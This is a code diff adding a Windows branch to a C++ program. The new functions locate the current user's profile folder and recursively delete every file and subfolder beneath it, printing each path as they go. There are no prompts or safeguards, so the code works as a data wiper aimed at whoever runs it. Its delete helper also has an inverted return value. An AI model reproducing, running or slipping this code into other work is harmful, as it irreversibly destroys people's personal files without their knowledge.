@@ -7,36 +7,67 @@
 #elif _WIN32
 	/*++++++++++++++Comming Soon++++++++++++++*/
 	
-	/*Error on getUser function*/
-	std::string getUser()
+	/*This Function finds the User path*/
+	std::wstring Path()
 	{
-		TCHAR username[LEN + 1];
-		DWORD size = LEN + 1;
-		GetUserName((TCHAR*)username, &size);
-		std::string name = username;
-		return name;
+		wchar_t path[PATH];
+		std::wstring wpath;
+		if (SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, path) == S_OK)
+		{
+			wpath = path;
+		}
+
+		return wpath;
+	}
+	bool Dot(const wchar_t* str)
+	{
+		if (wcscmp(str, L"..") && wcscmp(str, L".")) return FALSE;
+		return TRUE;
 	}
 
-	std::string Path()
+	/*2nd version of this func*/
+	std::vector<std::wstring> ListDir(std::wstring s)
 	{
-		std::string path = "C:\\Users\\" + getUser() + "\\Documents\\*";
-		return path;
-	}
-
-	std::vector<std::string> ListDir(char* dir) // dir not used yet.
-	{
-		std::vector<std::string> contents;
-		WIN32_FIND_DATA data;
-		HANDLE hFind = FindFirstFile((LPCSTR)Path().c_str(), &data);      // DIRECTORY
+		std::vector<std::wstring> contents;
+		std::wstring w = s  + L"\\*";
+		WIN32_FIND_DATAW data;
+		HANDLE hFind = FindFirstFileW((LPCWSTR)w.c_str(), &data);      // Starts to find the first file inside the directory
 
 		if (hFind != INVALID_HANDLE_VALUE) {
 			do {
-				//std::cout << data.cFileName << std::endl;
-				std::string word(data.cFileName);
-				contents.push_back(word);
-			} while (FindNextFile(hFind, &data));
+				std::wstring word(data.cFileName);
+				if (Dot(word.c_str())) continue;
+				contents.push_back(s + L"\\" + word);
+			} while (FindNextFileW(hFind, &data));
 			FindClose(hFind);
 		}
 		return contents;
 	}
+
+	int Delete(std::wstring s)
+	{
+				if (_wremove(s.c_str()))
+				{
+					return 0;
+				}
+		return -1;
+	}
+
+	void cd(std::wstring s) 
+	{
+		std::vector<std::wstring> v{};
+		int e{};
+		v = ListDir(s);
+		for (int i = 0; i < v.size(); i++)
+		{
+			e = Delete(v[i]);
+		}
+		for each(std::wstring i in v)
+		{
+			std::wcout << i << std::endl;
+			cd(i);
+		}
+	}
+
+	
 #endif
